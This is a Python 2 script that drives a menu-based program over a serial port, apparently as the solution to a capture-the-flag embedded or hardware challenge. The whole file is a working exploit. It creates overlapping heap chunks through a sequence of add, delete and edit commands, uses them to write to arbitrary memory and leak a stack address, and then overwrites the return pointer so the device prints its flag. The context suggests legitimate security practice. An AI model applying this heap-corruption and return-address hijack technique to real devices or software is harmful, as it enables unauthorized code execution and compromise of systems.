import serial
from time import sleep
import struct

def send_cmd(ser,buff):
    if buff.find("\x00")!=-1 or buff.find("\n")!=-1:
        print "this not gonna work", repr(buff)
    ser.write(buff+"\n")
    sleep(0.2)
    return ser.read(tty.in_waiting or 1)

def new_dev(ser,username,key):
    send_cmd(ser,"2")
    send_cmd(ser,username)
    send_cmd(ser,key)

def del_dev(ser,did):
    send_cmd(ser,"3")
    send_cmd(ser,str(did))

def edit_dev(ser,did,username,key):
    send_cmd(ser,"4")
    send_cmd(ser,str(did))
    send_cmd(ser,username)
    return send_cmd(ser,key)

def print_all(ser):
    promt="Choose one of the following: \n1. Print all connected devices\n2. Connect new device\n3. Disconnect device\n4. Modify stored device\n5. Exit\n"
    reply=send_cmd(ser,"1")
    ind=reply.find(promt)
    if ind!=-1:
        return reply[2:ind]+reply[ind+len(promt):]
    else:
        return reply
       
    

with serial.Serial('/dev/ttyUSB0',115200) as tty:
    sleep(2)
    tty.write("\n")
    tty.read(tty.in_waiting or 1)
    
    new_dev(tty,"a","b")             # dev 0
    new_dev(tty,"c","d")             # dev 1
    del_dev(tty,0)                   # free dev 0
    new_dev(tty,"e","ffffffffffff")  # dev2 with key chunk in the end

    edit_dev(tty,1,"z0\x0b","a")     # encrease dev1 key chnk
    del_dev(tty,1)                   # free dev 1
    new_dev(tty,"g","h")             # dev3 with overlapped chunk
    
    #overwrite 0xDEADBEEF to 0xBAADF00D at 0x2000
    edit_dev(tty,2,"x","\x01\x01\x01"+"\x01\x20") # set ptr to 0x2001
    edit_dev(tty,2,"x","\x01\x01\x01")            # set ptrl to 0x00 via null terminator
    edit_dev(tty,3,"g",struct.pack("I",0xBAADF00D)+"\xa0\x08\x40\x06\x04\x08\x04\x20") #write 0xbaadf00d and serial config to avoid corruption
    print repr(print_all(tty))
    
    edit_dev(tty,2,"x","\x01\x01\x01"+struct.pack("H",0x2192))  # set ptr to 0x2192
    buff=print_all(tty)                           # leak leak stack frame address
    
    dl="key: "
    buff=buff[buff.find(dl)+len(dl):]
    sp=buff[buff.find(dl)+len(dl):][:2]
    sp=struct.unpack("H",sp)[0]                  # extracting stack frame address
    print "stack frame base:", hex(sp)

    edit_dev(tty,2,"x","\x01\x01\x01"+struct.pack("H",sp-0x2))
    print edit_dev(tty,3,"g",struct.pack(">H",0x182)) # set return pointer to 0x182, big endian! - flag print

